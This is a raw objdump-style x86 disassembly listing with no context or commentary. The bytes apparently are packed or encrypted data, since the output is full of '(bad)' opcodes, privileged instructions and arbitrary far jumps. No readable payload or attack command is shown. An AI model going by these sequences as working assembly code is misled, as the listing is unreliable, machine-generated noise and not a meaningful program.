  4029fe:	aam    0x7a
  402a00:	dec    esi
  402a01:	add    ebp,DWORD PTR [esi-0x4fffae3e]
  402a07:	ss mov ch,dh
  402a0a:	popf   
  402a0b:	and    dh,cl
  402a0d:	sbb    al,0x6b
  402a0f:	xchg   ebx,eax
  402a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a12:	sbb    bl,dl
  402a14:	inc    ebx
  402a15:	or     dl,dl
  402a17:	or     ebp,eax
  402a19:	das    
  402a1a:	add    esi,DWORD PTR [eax]
  402a1c:	fnstenv [eax+0x39a147e7]
  402a22:	sub    eax,0x8245b1de
  402a27:	rcl    ah,cl
  402a29:	jecxz  0x4029c7
  402a2b:	(bad)  
  402a2c:	das    
  402a2d:	int    0xf3
  402a2f:	retf   
  402a30:	mov    edx,0xbbb20446
  402a35:	(bad)  
  402a37:	add    ecx,edx
  402a39:	mov    eax,ds:0x5ab3fbd2
  402a3e:	sbb    esp,DWORD PTR [ebx+0x29b84452]
  402a44:	mov    bh,0x3c
  402a46:	pushf  
  402a47:	inc    edi
  402a48:	mov    esi,DWORD PTR [ebp-0x54]
  402a4b:	out    dx,al
  402a4c:	ret    
  402a4d:	pop    esi
  402a4e:	sti    
  402a4f:	lods   al,BYTE PTR ds:[esi]
  402a50:	push   ss
  402a51:	and    DWORD PTR [edx+0x778811e],ebp
  402a57:	sub    eax,0x6cadef94
  402a5c:	jb     0x402a77
  402a5e:	mov    cl,dl
  402a60:	cmp    eax,0xadff31d6
  402a65:	mov    ah,0x46
  402a67:	loope  0x402ab5
  402a69:	setnp  BYTE PTR [ebx+0x255263dd]
  402a70:	loopne 0x402a48
  402a72:	mov    al,ds:0xd3ae7c66
  402a77:	int    0x29
  402a79:	pop    ebx
  402a7a:	scas   eax,DWORD PTR es:[edi]
  402a7b:	es mov ch,0xc7
  402a7e:	es ins DWORD PTR es:[edi],dx
  402a80:	and    bh,ah
  402a82:	retf   
  402a83:	pop    ds
  402a84:	jo     0x402a28
  402a86:	mov    bh,0x73
  402a88:	into   
  402a89:	and    al,0x2a
  402a8b:	(bad)  
  402a8c:	xor    al,0x36
  402a8e:	into   
  402a8f:	int3   
  402a90:	add    BYTE PTR [edi],al
  402a92:	push   esi
  402a93:	xor    DWORD PTR [ecx+0x38],edi
  402a96:	mov    ebp,DWORD PTR [edx]
  402a98:	xchg   ebp,ebp
  402a9a:	cmp    DWORD PTR [eax+0x2c617435],edi
  402aa0:	scas   al,BYTE PTR es:[edi]
  402aa1:	mov    ebx,0xf398346d
  402aa6:	or     DWORD PTR [ebx],edx
  402aa8:	xlat   BYTE PTR ds:[ebx]
  402aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aaa:	push   cs
  402aab:	mov    eax,ds:0x133d4651
  402ab0:	test   al,0x62
  402ab2:	xchg   ebp,eax
  402ab3:	loopne 0x402a63
  402ab5:	lods   al,BYTE PTR ds:[esi]
  402ab6:	leave  
  402ab7:	in     al,0xff
  402ab9:	test   BYTE PTR [edi+esi*1-0x16],dl
  402abd:	loop   0x402a5d
  402abf:	sub    al,0xb8
  402ac1:	add    DWORD PTR [edx-0x56],ecx
  402ac4:	stos   DWORD PTR es:[edi],eax
  402ac5:	(bad)  
  402ac6:	(bad)  
  402ac7:	ja     0x402a9f
  402ac9:	mov    al,al
  402acb:	stc    
  402acc:	cmp    eax,0xbfb2531e
  402ad1:	mov    cs,WORD PTR [ebx-0x4]
  402ad4:	mov    edx,0x70abc565
  402ad9:	or     BYTE PTR gs:[edx],bh
  402adc:	loop   0x402ac4
  402ade:	cmp    ecx,DWORD PTR [ecx+0x61]
  402ae1:	bound  eax,QWORD PTR [ebx-0x56]
  402ae4:	mul    BYTE PTR [ebx-0x43]
  402ae7:	(bad)  
  402ae8:	pushf  
  402ae9:	mov    al,0xf5
  402aeb:	shl    ecx,cl
  402aed:	pop    edx
  402aee:	loope  0x402aa3
  402af0:	fadd   DWORD PTR [edx-0x38]
  402af3:	jo     0x402b10
  402af5:	jnp    0x402ab6
  402af7:	mov    ah,0x4f
  402af9:	sub    ebp,DWORD PTR [si+0x50]
  402afd:	mov    al,0x51
  402aff:	jnp    0x402a83
  402b01:	fs inc eax
  402b03:	aam    0x82
  402b05:	push   edx
  402b06:	(bad)  
  402b07:	sbb    BYTE PTR [esi],bl
  402b09:	cli    
  402b0a:	add    ebx,DWORD PTR [ecx+ecx*2+0x6e]
  402b0e:	jb     0x402b6e
  402b10:	jle    0x402b42
  402b12:	mov    eax,0x1b42a52f
  402b17:	cwde   
  402b18:	and    al,0x4d
  402b1a:	(bad)  
  402b1b:	fcom   DWORD PTR [esi-0x55436611]
  402b21:	and    al,BYTE PTR [ecx+0x19]
  402b24:	xchg   ebx,eax
  402b25:	(bad)  
  402b26:	loop   0x402aaa
  402b28:	or     BYTE PTR [ebp-0xb501d7d],bl
  402b2e:	mov    edi,0xedd2ca61
  402b33:	inc    edx
  402b34:	mov    cl,0xa1
  402b36:	sub    DWORD PTR [eax+0x4dd83b5],edi
  402b3c:	mov    al,dl
  402b3e:	jne    0x402b2f
  402b40:	outs   dx,DWORD PTR ds:[esi]
  402b41:	mov    dl,BYTE PTR [eax-0x2bd3c72]
  402b47:	pusha  
  402b48:	sub    edx,DWORD PTR [eax+ebx*1+0x3453daf5]
  402b4f:	pusha  
  402b50:	cs jo  0x402b24
  402b53:	imul   edi,esp,0x52d52b4c
  402b59:	ret    0xcc0
  402b5c:	xlat   BYTE PTR ds:[ebx]
  402b5d:	fnstsw WORD PTR [edi+0x328e3ada]
  402b63:	dec    edi
  402b64:	inc    esp
  402b65:	xor    cl,dl
  402b67:	and    al,0xed
  402b69:	pop    ss
  402b6a:	(bad)  [ecx]
  402b6c:	mov    edx,0x99941694
  402b71:	pop    esi
  402b72:	cdq    
  402b73:	scas   eax,DWORD PTR es:[edi]
  402b74:	rcr    BYTE PTR [edx+ebp*1+0x53],1
  402b78:	jl     0x402bcb
  402b7a:	hlt    
  402b7b:	in     al,dx
  402b7c:	cmp    esi,DWORD PTR [esi+ebp*4]
  402b7f:	mov    ebp,0x216b93da
  402b84:	fisubr DWORD PTR [ebx+0x42]
  402b87:	ss inc eax
  402b89:	int    0xa
  402b8b:	xchg   ebp,eax
  402b8c:	mov    edx,0x43e0c79b
  402b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b92:	pop    ebp
  402b93:	rol    ah,0xc1
  402b96:	pop    ebx
  402b97:	addr16 mov eax,0x2ed049e2
  402b9d:	(bad)  
  402b9e:	push   edx
  402b9f:	jb     0x402bf4
  402ba1:	cmp    al,0x93
  402ba3:	stc    
  402ba4:	aas    
  402ba5:	mov    DWORD PTR [edx],edi
  402ba7:	jnp    0x402b84
  402ba9:	stos   BYTE PTR es:[edi],al
  402baa:	imul   esi,edx,0x1
  402bad:	mov    ebx,0xca09bc9d
  402bb2:	addr16 retf 0x325f
  402bb6:	fsub   QWORD PTR [edi-0x8]
  402bb9:	add    BYTE PTR [eax],ah
  402bbb:	mov    dh,dl
  402bbd:	and    ebx,DWORD PTR [eax]
  402bbf:	jbe    0x402bbc
  402bc1:	xor    DWORD PTR [edx-0x72b6c941],ecx
  402bc7:	inc    esi
  402bc8:	sub    DWORD PTR [esi-0x580326a8],0x4a224efb
  402bd2:	mov    dl,0xc
  402bd4:	or     BYTE PTR [ebx-0x2aeb87de],bh
  402bda:	mov    al,ds:0x656e786b
  402bdf:	stc    
  402be0:	xor    cl,al
  402be2:	clc    
  402be3:	je     0x402ba3
  402be5:	mov    ds:0x71beae52,al
  402bea:	stos   DWORD PTR es:[edi],eax
  402beb:	mov    edi,0xbf1f6990
  402bf0:	pop    esi
  402bf1:	outs   dx,BYTE PTR ds:[esi]
  402bf2:	ins    BYTE PTR es:[edi],dx
  402bf3:	dec    esp
  402bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bf5:	mov    cl,0xb9
  402bf7:	dec    edx
  402bf8:	ret    0xccc1
  402bfb:	and    BYTE PTR [ecx-0x1e56617a],al
  402c01:	test   eax,0x460bcf4f
  402c06:	jl     0x402c7f
  402c08:	jo     0x402bd1
  402c0a:	pop    edx
  402c0b:	fwait
  402c0c:	sub    al,BYTE PTR [ecx+0x1c1588a0]
  402c12:	rcl    BYTE PTR [ebp-0x74994080],1
  402c18:	add    dl,BYTE PTR [edi-0x430102a1]
  402c1e:	out    0x30,eax
  402c20:	xor    eax,0xf3ece29b
  402c25:	test   dh,cl
  402c27:	inc    esp
  402c28:	add    DWORD PTR [ebp-0x7a5e490c],0xb8e92e05
  402c32:	sub    al,0x6f
  402c34:	das    
  402c35:	repz rol BYTE PTR [ecx+ebx*4-0x47],0x3c
  402c3b:	jl     0x402c61
  402c3d:	and    ch,BYTE PTR [esi]
  402c3f:	jae    0x402c5a
  402c41:	in     eax,dx
  402c42:	and    DWORD PTR [ebp-0x12],esi
  402c45:	add    edx,ebx
  402c47:	add    DWORD PTR [ecx-0x58],esp
  402c4a:	push   ecx
  402c4b:	fist   DWORD PTR [ebp+0x8]
  402c4e:	movq   QWORD PTR [ecx+0x32a4173d],mm4
  402c55:	sbb    BYTE PTR [ecx],cl
  402c57:	jb     0x402cb0
  402c59:	sbb    bh,BYTE PTR [esi-0x41f1e2f9]
  402c5f:	iret   
  402c60:	xchg   esp,eax
  402c61:	lods   eax,DWORD PTR ds:[esi]
  402c62:	adc    al,0x5d
  402c64:	(bad)  
  402c65:	ds push ss
  402c67:	ret    0x4d82
  402c6a:	loop   0x402c2b
  402c6c:	fsubr  QWORD PTR [esi-0x3e]
  402c6f:	adc    DWORD PTR [ebx+eax*8+0x72],ebx
  402c73:	push   edx
  402c74:	popa   
  402c75:	or     BYTE PTR [edi-0x6b],0xc7
  402c79:	(bad)  
  402c7a:	retf   0x407
  402c7d:	fdivrp st(1),st
  402c7f:	das    
  402c80:	jbe    0x402c1f
  402c82:	jae    0x402c4a
  402c84:	cmp    BYTE PTR [ecx-0x7afcb206],ah
  402c8a:	mov    gs,edx
  402c8c:	push   esi
  402c8d:	mov    bh,0x93
  402c8f:	rcr    DWORD PTR [ebx],1
  402c91:	cmp    DWORD PTR [eax-0x58],esp
  402c94:	lods   al,BYTE PTR ds:[esi]
  402c95:	data16 fs std 
  402c98:	cmp    al,0x13
  402c9a:	(bad)  
  402c9c:	sub    DWORD PTR [eax-0x3b824558],ebp
  402ca2:	ins    BYTE PTR es:[edi],dx
  402ca3:	xchg   ch,cl
  402ca5:	push   edx
  402ca6:	or     DWORD PTR [edx+0x16],ebp
  402ca9:	xor    BYTE PTR [ebp+0x7d9663f4],al
  402caf:	dec    ebp
  402cb0:	out    dx,eax
  402cb1:	lock sbb DWORD PTR [edi],eax
  402cb4:	leave  
  402cb5:	rcr    BYTE PTR [esp+eax*1+0x6e914e9b],1
  402cbc:	and    eax,0x3cafa3ff
  402cc1:	sbb    eax,0x3c227f4d
  402cc6:	inc    esp
  402cc7:	call   0x7fb721e8
  402ccc:	loopne 0x402cf4
  402cce:	clc    
  402ccf:	ins    BYTE PTR es:[edi],dx
  402cd0:	mov    dh,0x53
  402cd2:	push   eax
  402cd3:	add    DWORD PTR [ebx-0x6936d6ed],esp
  402cd9:	fbstp  TBYTE PTR [ebx+0x15f1d17]
  402cdf:	dec    esp
  402ce0:	(bad)  
  402ce2:	adc    edi,DWORD PTR [ebx+0x51f3658f]
  402ce8:	icebp  
  402ce9:	jg     0x402c91
  402ceb:	push   ebx
  402cec:	adc    ah,ah
  402cee:	push   ss
  402cef:	int3   
  402cf0:	add    BYTE PTR [ebx+0x6e],bh
  402cf3:	fiadd  DWORD PTR [edi]
  402cf5:	lock in eax,dx
  402cf7:	data16 xor BYTE PTR cs:[ebx+eiz*2],dl
  402cfc:	(bad)  
  402cfd:	jecxz  0x402d2e
  402cff:	and    BYTE PTR [eax+0x2],ah
  402d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d03:	mov    edx,0xe11bfdc
  402d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d09:	jmp    0x4c0cd8b7
  402d0e:	popf   
  402d0f:	imul   ebp,DWORD PTR [edi+0x3d],0xffffffda
  402d13:	add    BYTE PTR [ecx+0x4d],ah
  402d16:	icebp  
  402d17:	rcr    BYTE PTR [eax],cl
  402d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d1a:	push   0xfc29b494
  402d1f:	fisttp QWORD PTR [ecx-0x6ac396e2]
  402d25:	cmp    bl,BYTE PTR [ebx-0x73]
  402d28:	push   ecx
  402d29:	sub    DWORD PTR [esi-0x2b],ebp
  402d2c:	fcmovbe st,st(6)
  402d2e:	pop    edx
  402d2f:	es or  edi,esi
  402d32:	pop    es
  402d33:	xor    ecx,DWORD PTR [ebx-0x6f63f133]
  402d39:	sub    DWORD PTR [ebp+0x2],ebp
  402d3c:	adc    eax,0x873fe325
  402d41:	lea    ebx,[ebx+0x49]
  402d44:	jae    0x402d0c
  402d46:	sbb    DWORD PTR [eax-0x18c3b8a],esi
  402d4c:	and    al,0xcc
  402d4e:	in     eax,0xf8
  402d50:	push   ss
  402d51:	dec    edi
  402d52:	shr    dl,1
  402d54:	mov    esp,0x3e0ab29e
  402d59:	add    eax,0x19e59317
  402d5e:	in     eax,dx
  402d5f:	pushf  
  402d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d61:	test   eax,0xe9607354
  402d66:	mov    ah,cl
  402d68:	into   
  402d69:	or     eax,esi
  402d6b:	lods   al,BYTE PTR ds:[esi]
  402d6c:	sbb    al,0xd9
  402d6e:	iret   
  402d6f:	sub    bh,0xe6
  402d72:	add    al,0xc7
  402d74:	sbb    DWORD PTR [edi-0x30],0xd685474c
  402d7b:	inc    ebx
  402d7c:	jns    0x402d1d
  402d7e:	cmp    al,0xcd
  402d80:	xchg   esi,eax
  402d81:	inc    ecx
  402d82:	inc    eax
  402d83:	adc    ebx,DWORD PTR [edx]
  402d85:	repz cmp dl,BYTE PTR [eax+0x509d87e4]
  402d8c:	ins    DWORD PTR es:[edi],dx
  402d8d:	or     eax,0xafb33d58
  402d92:	mov    edx,0x63ba635b
  402d97:	in     al,dx
  402d98:	mov    edi,0x78d9fad
  402d9d:	test   edx,eax
  402d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da0:	lods   al,BYTE PTR ds:[esi]
  402da1:	sti    
  402da2:	aaa    
  402da3:	mov    eax,ds:0xa37e15da
  402da8:	in     eax,0x9f
  402daa:	addr16 jge 0x402d54
  402dad:	cmp    eax,0x935b7efd
  402db2:	jbe    0x402d9c
  402db4:	mov    bh,0xb7
  402db6:	clc    
  402db7:	(bad)  [edi+0x16064b24]
  402dbd:	imul   edx,DWORD PTR [ecx+ebx*2+0x368f6677],0x34
  402dc5:	in     al,dx
  402dc6:	cs pop ss
  402dc8:	leave  
  402dc9:	pop    edi
  402dca:	lea    ebp,[esi-0x2b]
  402dcd:	push   ecx
  402dce:	mov    al,0xc9
  402dd0:	icebp  
  402dd1:	pushf  
  402dd2:	mov    ecx,0xccec27c8
  402dd7:	push   ecx
  402dd8:	xchg   BYTE PTR ds:0x1a0fe6d2,ch
  402dde:	sub    eax,0x3385e533
  402de3:	jbe    0x402e14
  402de5:	mov    ah,0x49
  402de7:	push   ebp
  402de8:	cmp    BYTE PTR [edi+esi*8-0x79],cl
  402dec:	xchg   DWORD PTR [ebx+0x3a60f0f1],esp
  402df2:	mov    ss,esp
  402df4:	data16 loop 0x402db4
  402df7:	mov    edi,0x1ba26c1c
  402dfc:	aaa    
  402dfd:	loope  0x402d83
  402dff:	imul   DWORD PTR [esi-0x6b]
  402e02:	dec    ecx
  402e03:	and    eax,DWORD PTR [eax]
  402e05:	lods   al,BYTE PTR ds:[esi]
  402e06:	adc    ebp,esi
  402e08:	pop    esi
  402e09:	lahf   
  402e0a:	jno    0x402dca
  402e0c:	xor    DWORD PTR [eax+edi*8],ebp
  402e0f:	jb     0x402dbe
  402e11:	xchg   DWORD PTR [esi],ebp
  402e13:	xor    al,0x29
  402e15:	pop    DWORD PTR [ebx+0x68b0006c]
  402e1b:	popw   es
  402e1d:	mov    edi,0x6f8428d9
  402e22:	aaa    
  402e23:	stos   DWORD PTR es:[edi],eax
  402e24:	stos   BYTE PTR es:[edi],al
  402e25:	push   0x4ba1f25a
  402e2a:	addr16 mov ds:0x7baf,al
  402e2e:	(bad)  
  402e2f:	push   esp
  402e30:	test   DWORD PTR [esi-0x4a1a7801],ebx
  402e36:	jno    0x402e93
  402e38:	retf   
  402e39:	xchg   edx,eax
  402e3a:	jnp    0x402e08
  402e3c:	adc    al,0x1
  402e3e:	mov    edi,0x22dd19e0
  402e43:	call   0xdf160c51
  402e48:	or     DWORD PTR [esi],0x9a7b8991
  402e4e:	push   0xdce4a454
  402e53:	add    DWORD PTR [edx-0x43cd1940],edi
  402e59:	mov    dl,0xd5
  402e5b:	enter  0xeb4b,0x5b
  402e5f:	sub    eax,DWORD PTR [ebp-0x2e]
  402e62:	xchg   BYTE PTR [ebx-0x32e3fd92],cl
  402e68:	xchg   esi,eax
  402e69:	pop    ebp
  402e6a:	mov    al,ss:0x89d4b31e
  402e70:	add    eax,0x9cfc55f6
  402e75:	sbb    ebp,edi
  402e77:	push   esp
  402e78:	sbb    BYTE PTR ds:0x1596c69e,bl
  402e7e:	aam    0x9
  402e80:	dec    esi
  402e81:	mov    ds:0x3b1da51,al
  402e86:	cmp    esp,DWORD PTR [edi+0x30aebd57]
  402e8c:	cmp    al,0x35
  402e8e:	sbb    DWORD PTR [edi+0xb],0x53
  402e92:	jge    0x402e69
  402e94:	retf   0xfdcc
  402e97:	rol    DWORD PTR [ecx-0x79],0x5d
  402e9b:	clc    
  402e9c:	mov    esi,0x833d5bb8
  402ea1:	lods   eax,DWORD PTR ds:[esi]
  402ea2:	xchg   ecx,eax
  402ea3:	repnz pop ss
  402ea5:	cmp    al,0x8f
  402ea7:	xchg   edx,eax
  402ea8:	leave  
  402ea9:	xchg   ebp,eax
  402eaa:	mov    ebp,0x84d15e41
  402eb0:	push   es
  402eb1:	test   al,0xe
  402eb3:	push   edx
  402eb4:	sub    dh,BYTE PTR [esp+edi*1+0x44868c95]
  402ebb:	sbb    esp,DWORD PTR [esi+0x3c]
  402ebe:	jge    0x402efe
  402ec0:	push   ebp
  402ec1:	lea    edi,[edi]
  402ec3:	cmc    
  402ec4:	iret   
  402ec5:	inc    ecx
  402ec6:	gs xchg ebp,eax
  402ec8:	mov    esi,0xde9b52c2
  402ecd:	jns    0x402e51
  402ecf:	repz cld 
  402ed1:	jle    0x402ec5
  402ed3:	mov    ?,WORD PTR [edx]
  402ed5:	rcl    BYTE PTR [edi],1
  402ed7:	push   ds
  402ed8:	mov    ebx,0x43991232
  402edd:	mov    ?,ebx
  402edf:	pusha  
  402ee0:	push   es
  402ee1:	scas   eax,DWORD PTR es:[edi]
  402ee2:	loopne 0x402e83
  402ee4:	stos   DWORD PTR es:[edi],eax
  402ee5:	pop    ds
  402ee6:	gs test eax,0xecd32363
  402eec:	call   0x45c35dd7
  402ef1:	fst    DWORD PTR [ebx+0x28]
  402ef4:	mov    es,WORD PTR [edi]
  402ef6:	mov    bh,0xe6
  402ef8:	or     dh,BYTE PTR [edx+0x54]
  402efb:	inc    eax
  402efc:	jecxz  0x402f3a
  402efe:	sbb    bl,dh
  402f00:	inc    bp
  402f02:	jmp    0x6f65:0x50f9db81
  402f09:	jb     0x402f60
  402f0b:	js     0x402f82
  402f0d:	sti    
  402f0e:	inc    eax
  402f0f:	xchg   esi,eax
  402f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f11:	pusha  
  402f12:	sbb    eax,0x7c7186c7
  402f17:	pop    ebp
  402f18:	or     eax,0x2cbe121c
  402f1d:	ret    0x1c78
  402f20:	div    DWORD PTR [ebx+0x12ce5809]
  402f26:	icebp  
  402f27:	out    0x54,al
  402f29:	mov    bh,0x24
  402f2b:	adc    ch,BYTE PTR [eax-0x59]
  402f2e:	lahf   
  402f2f:	icebp  
  402f30:	sahf   
  402f31:	inc    edi
  402f32:	sbb    edx,esi
  402f34:	fistp  DWORD PTR [esi]
  402f36:	sbb    BYTE PTR [eax+0x47],dh
  402f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f3a:	jl     0x402efd
  402f3c:	adc    eax,0xd2c43c35
  402f41:	pusha  
  402f42:	stos   DWORD PTR es:[edi],eax
  402f43:	mov    ds:0x4dfe41b9,al
  402f48:	jg     0x402f6e
  402f4a:	xor    ch,0x39
  402f4d:	aas    
  402f4e:	or     al,0x8e
  402f50:	add    BYTE PTR [edi],ch
  402f52:	fmul   QWORD PTR [edi-0x24]
  402f55:	sbb    ebp,DWORD PTR [ecx+0x28]
  402f58:	inc    edi
  402f59:	pop    ebp
  402f5a:	push   0xfffffff5
  402f5c:	(bad)  
  402f5d:	call   0x1a2fdabe
  402f62:	outs   dx,DWORD PTR ds:[esi]
  402f63:	dec    eax
  402f64:	xor    BYTE PTR [edi+ebx*4+0x594f9234],bl
  402f6b:	mov    BYTE PTR [ebp-0x5c995f91],ah
  402f71:	and    ecx,esi
  402f73:	repz cmp ch,BYTE PTR [ebx-0x5f4669ef]
  402f7a:	mov    ebx,0x8133dd2c
  402f7f:	mov    bl,0x6c
  402f81:	cwde   
  402f82:	pop    ds
  402f83:	out    0xb0,eax
  402f85:	(bad)  
  402f86:	adc    eax,0x5ba5bee8
  402f8b:	nop
  402f8c:	daa    
  402f8d:	loop   0x402fc8
  402f8f:	jo     0x402fd5
  402f91:	sbb    ebx,DWORD PTR [eax+0x65242a2d]
  402f97:	sti    
  402f98:	jne    0x403007
  402f9a:	setae  BYTE PTR [edx-0x31]
  402f9e:	mov    al,0xe3
  402fa0:	adc    eax,0x666759a0
  402fa5:	sbb    al,0x32
  402fa7:	sub    eax,0x38f4a076
  402fac:	lods   al,BYTE PTR ds:[esi]
  402fad:	dec    BYTE PTR [ebp+0xdb5c605]
  402fb3:	sub    al,0xad
  402fb5:	inc    edx
  402fb6:	lods   eax,DWORD PTR ds:[esi]
  402fb7:	pop    es
  402fb8:	enter  0x7237,0xe1
  402fbc:	imul   edi,ebp,0x10124d8f
  402fc2:	scas   eax,DWORD PTR es:[edi]
  402fc3:	push   ebp
  402fc4:	cli    
  402fc5:	mov    BYTE PTR [ebx-0x17],bh
  402fc8:	or     BYTE PTR [esi+eax*4-0xc0b5052],cl
  402fcf:	inc    ebx
  402fd0:	xor    BYTE PTR [ebp+0x3068a6b4],dl
  402fd6:	lds    ebx,FWORD PTR [esi]
  402fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fd9:	mov    bh,0xb1
  402fdb:	lods   al,BYTE PTR ds:[esi]
  402fdc:	cld    
  402fdd:	mov    ebp,0x5fd9d69c
  402fe2:	dec    eax
  402fe3:	int3   
  402fe4:	js     0x40305d
  402fe6:	add    ebp,edi
  402fe8:	xchg   edi,eax
  402fe9:	pop    ss
  402fea:	icebp  
  402feb:	sbb    al,0xe
  402fed:	mov    edi,0xaef988e1
  402ff2:	test   al,0x32
  402ff4:	pop    esp
  402ff5:	leave  
  402ff6:	sbb    ebx,0x794fee92
  402ffc:	cmp    BYTE PTR [esi+edx*8+0x70],cl
  403000:	mov    cl,bh
  403002:	xchg   edx,eax
  403003:	stc    
  403004:	cwde   
  403005:	xchg   DWORD PTR [edi],esp
  403007:	dec    esi
  403008:	adc    edx,ebp
  40300a:	daa    
  40300b:	pop    edi
  40300c:	push   esi
  40300d:	test   eax,0x8277ae0a
  403012:	adc    DWORD PTR [edi+0x13],eax
  403015:	mov    ah,0x5
  403017:	ret    
  403018:	ins    DWORD PTR es:[edi],dx
  403019:	mov    bh,0x29
  40301b:	rcl    ecx,0xe5
  40301e:	retf   0x8b3f
  403021:	push   0x5f
  403023:	sbb    al,0x9b
  403025:	pop    esp
  403026:	sub    al,0xf3
  403028:	les    eax,FWORD PTR [ebp+0x43dc1d3f]
  40302e:	mov    dh,0x1e
  403030:	aad    0x99
  403032:	lea    esp,[eax]
  403034:	outs   dx,DWORD PTR ds:[esi]
  403035:	pop    ss
  403036:	cmp    al,0xd2
  403038:	inc    eax
  403039:	or     esp,esi
  40303b:	out    0xdc,al
  40303d:	inc    ecx
  40303e:	or     esi,DWORD PTR [ebx]
  403040:	in     eax,0x83
  403042:	xchg   esp,eax
  403043:	jmp    0xdd5df7cd
  403048:	lock xor BYTE PTR [esi+0x17e13946],0xf3
  403050:	pop    edx
  403051:	sub    BYTE PTR [ecx-0x54616a33],bh
  403057:	iret   
  403058:	je     0x403001
  40305a:	ret    0x9652
  40305d:	push   ds
  40305e:	daa    
  40305f:	mov    al,0x91
  403061:	jnp    0x403034
  403063:	inc    ebx
  403064:	jbe    0x403028
  403066:	pop    ds
  403067:	pop    ecx
  403068:	push   edx
  403069:	enter  0x9c4a,0xd0
  40306d:	in     al,dx
  40306e:	xchg   ecx,eax
  40306f:	call   DWORD PTR [esi]
  403071:	mov    ebx,0x5c3fb55c
  403076:	sbb    DWORD PTR [edx+ebx*4-0x404379fb],esp
  40307d:	sahf   
  40307e:	pop    esi
  40307f:	sub    BYTE PTR [edx+ebp*1+0x4d],bl
  403083:	xchg   DWORD PTR [ebp+0x915b377],ebp
  403089:	xor    al,0x65
  40308b:	push   ebx
  40308c:	xchg   edx,eax
  40308d:	in     eax,0x79
  40308f:	cmp    al,0x6e
  403091:	mov    al,BYTE PTR [edi]
  403093:	push   ds
  403094:	inc    eax
  403095:	inc    ebp
  403096:	fbstp  TBYTE PTR [ebx+0x4ea5a552]
  40309c:	and    DWORD PTR [edi],edi
  40309e:	mov    fs,esi
  4030a0:	shl    BYTE PTR [edi-0x63193cb9],1
  4030a6:	jmp    0x9f35:0x615c12ff
  4030ad:	sahf   
  4030ae:	test   DWORD PTR [ebp+0xe],0x894394bd
  4030b5:	inc    ebx
  4030b6:	pop    esi
  4030b7:	xchg   al,dh
  4030b9:	iret   
  4030ba:	stc    
  4030bb:	jne    0x40305d
  4030bd:	add    eax,0x7b216aa8
  4030c2:	fild   WORD PTR [eax+0x437bb0a5]
  4030c8:	add    BYTE PTR [bp+di-0x24],ch
  4030cc:	pop    es
  4030cd:	into   
  4030ce:	xor    eax,0xee1e9733
  4030d3:	test   DWORD PTR [eax],edx
  4030d5:	in     eax,0x6b
  4030d7:	mov    ebp,DWORD PTR [ecx-0x5bdbc845]
  4030dd:	adc    dh,BYTE PTR [edx-0x2]
  4030e0:	fs (bad) 
  4030e2:	mov    gs,WORD PTR [ecx+0x678ba5e9]
  4030e8:	into   
  4030e9:	sbb    eax,0xd607b782
  4030ee:	cmp    DWORD PTR [eax],esp
  4030f0:	add    bl,BYTE PTR [edx+esi*1-0x66]
  4030f4:	or     DWORD PTR [edx+ebp*4-0x4a],0x839a35e1
  4030fc:	ret    0xfd66
  4030ff:	nop
  403100:	jne    0x40316c
  403102:	imul   ebx,DWORD PTR [eax+0x18],0xfffffff5
  403106:	icebp  
  403107:	adc    edi,edi
  403109:	xchg   DWORD PTR [edx],ebp
  40310b:	test   BYTE PTR [esi+0x2c6b62b7],al
  403111:	cli    
  403112:	(bad)  
  403113:	cld    
  403114:	dec    esp
  403115:	xchg   bp,ax
  403117:	jnp    0x403157
  403119:	mov    ch,0xdf
  40311b:	mul    BYTE PTR ds:0xa61997a7
  403121:	ins    DWORD PTR es:[edi],dx
  403122:	aaa    
  403123:	xor    dh,bh
  403125:	xchg   ebx,eax
  403126:	push   ss
  403127:	(bad)  
  403128:	jl     0x4030fc
  40312a:	mov    ah,0x8
  40312c:	leave  
  40312d:	mov    DWORD PTR [ebx],edi
  40312f:	retf   
  403130:	pop    edi
  403131:	push   ebx
  403132:	mov    ds,WORD PTR [edi+ebx*4]
  403135:	xchg   esi,eax
  403136:	and    al,0xd4
  403138:	lock (bad) 
  40313a:	int    0x7b
  40313c:	mov    edx,0xe898a9d9
  403141:	mov    al,ds:0xf5f1c98a
  403146:	cdq    
  403147:	xor    DWORD PTR [ebx+0x6e1ceb22],esp
  40314d:	lock pushfw 
  403150:	ror    BYTE PTR [edi-0xda03648],1
  403156:	sub    eax,0x4dfd7cd2
  40315b:	jl     0x4030ef
  40315d:	loopne 0x403143
  40315f:	xchg   dh,bh
  403161:	(bad)  
  403162:	pusha  
  403163:	sbb    BYTE PTR [ebp-0x2a9b80b4],0x67
  40316a:	stos   BYTE PTR es:[edi],al
  40316b:	cmp    ecx,DWORD PTR [esi+0x1bd1d13c]
  403171:	stos   BYTE PTR es:[edi],al
  403172:	in     al,dx
  403173:	adc    BYTE PTR ds:0x422eb5fc,ch
  403179:	shl    DWORD PTR [esi-0x6a],cl
  40317c:	xor    BYTE PTR ds:0x5b6eaa2b,al
  403182:	pop    es
  403183:	jb     0x40316f
  403185:	pop    ds
  403186:	cs dec ebp
  403188:	push   esi
  403189:	mov    ch,0xee
  40318b:	pop    edx
  40318c:	ret    
  40318d:	into   
  40318e:	cmp    al,0x7b
  403190:	inc    ebx
  403191:	inc    esi
  403192:	cli    
  403193:	mov    ss,WORD PTR [ecx+0x74]
  403196:	scas   eax,DWORD PTR es:[edi]
  403197:	sub    BYTE PTR [ecx+eiz*2],0xf6
  40319b:	mov    ah,0x8e
  40319d:	ror    DWORD PTR ds:0x21f404a5,0x89
  4031a4:	pop    esp
  4031a5:	scas   al,BYTE PTR es:[edi]
  4031a6:	(bad)  
  4031a7:	das    
  4031a8:	xor    BYTE PTR ds:0xe358aa88,0x11
  4031af:	jp     0x40316a
